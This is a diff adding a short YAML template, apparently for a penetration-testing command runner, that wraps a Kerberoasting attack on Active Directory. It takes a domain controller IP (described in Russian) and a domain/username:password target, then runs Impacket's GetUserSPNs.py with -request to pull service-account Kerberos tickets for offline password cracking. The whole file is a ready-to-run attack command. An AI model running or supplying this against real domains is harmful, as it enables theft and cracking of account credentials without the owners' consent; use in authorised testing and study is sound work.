@@ -1,0 +1,20 @@
+description: Kerberoasting
+author: vinzekatze
+tags:
+  - kerberos
+  - Kerberoasting
+
+arguments:
+  dc-ip:
+    description: IP адрес контроллера домена
+  target:
+    description: domain[/username[:password]]
+
+mode:
+  format:
+    target: '{!r}'
+    dc-ip: '{!r}'
+
+shell: bash
+script: >-
+  GetUserSPNs.py -request -dc-ip #dc-ip# #target#
